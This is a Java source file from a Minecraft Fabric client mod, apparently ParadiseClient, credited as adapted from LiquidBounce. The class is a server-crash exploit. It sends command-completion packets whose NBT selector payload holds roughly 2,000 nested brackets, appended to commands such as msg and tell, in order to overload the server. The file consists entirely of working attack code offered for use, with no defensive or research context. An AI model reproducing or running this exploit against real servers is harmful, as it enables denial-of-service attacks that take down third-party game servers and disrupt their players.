package tk.milkthedev.paradiseclientfabric.exploit;

import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import tk.milkthedev.paradiseclientfabric.Helper;

import java.util.Objects;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

// Credits to https://liquidbounce.net/ as it's taken from LiquidBounce
// https://github.com/CCBlueX/LiquidBounce/blob/nextgen/src/main/kotlin/net/ccbluex/liquidbounce/features/module/modules/exploit/servercrasher/exploits/CompletionExploit.kt

public class CompletionCrashExploit
{
    private final MinecraftClient minecraftClient = MinecraftClient.getInstance();
    private static final String nbtExecutor = " @a[nbt={PAYLOAD}]";
    private final String[] knownWorkingMessages =
    {
            "msg",
            "minecraft:msg",
            "tell",
            "minecraft:tell",
            "tm",
            "teammsg",
            "minecraft:teammsg",
            "minecraft:w",
            "minecraft:me"
    };

    private int messageIndex = 0;
    public void enable()
    {
        thread.start();
    }

    private Thread thread = new Thread(() ->
    {

        if (messageIndex == knownWorkingMessages.length)
        {
            messageIndex = 0;
            return;
        }

        try
        {
        Thread.sleep(20);
        }
        catch (InterruptedException e)
        {
        e.printStackTrace();
        }

        String knownMessage = knownWorkingMessages[messageIndex] + nbtExecutor;
        int len = 2044 - knownMessage.length();
        String overflow = generateJsonObject(len);
        String partialCommand = knownMessage.replace("{PAYLOAD}", overflow);

        int packets = 3;
        for (int i = 0; i < packets; i++)
        {
            Helper.sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
        }
        messageIndex++;
    });

    private String generateJsonObject(int levels)
    {
        String json = IntStream.range(0, levels)
                .mapToObj(i -> "[")
                .collect(Collectors.joining());

        json = "{a:" + json + "}";
        return json;
    }
}